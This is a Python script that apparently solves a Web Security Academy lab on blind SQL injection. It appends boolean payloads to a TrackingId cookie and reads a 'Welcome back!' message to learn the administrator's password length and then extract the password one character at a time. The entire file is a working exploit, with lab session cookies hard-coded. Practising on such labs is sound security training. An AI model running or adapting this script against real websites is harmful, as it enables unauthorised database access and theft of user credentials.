import requests
import string

charset = string.ascii_lowercase + string.digits

burp0_url = "https://0a9800e103ff2b8481781b8400b1002c.web-security-academy.net:443/filter?category=Pets"
burp0_cookies = {
    "TrackingId": "y2KC1T2TtKCUzTbd",
    "session": "CrCtUOzTMiNBMdUAsbbVQ2HetHhYuuUL",
}

res = requests.get(burp0_url, cookies=burp0_cookies)


# Sample payload: ' AND (select 'a' from users where username='administrator' and length(password)=20)='a
def blind_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    return "Welcome back!" in res.text

def get_password_length():
    length = 0
    while True:
        payload = f"' AND (select 'a' from users where username='administrator' and length(password)={length})='a"
        if blind_sql(payload):
            return length
        length += 1

def get_password():
    password_length = get_password_length()
    print(f"Password length: {password_length}")
    password = ""
    for i in range(password_length):
        for char in charset:
            payload = f"' AND (select 'a' from users where username='administrator' and substr(password, {i+1}, 1)='{char}')='a"
            if blind_sql(payload):
                password += char
                print(password)
                break
    return password

print(get_password())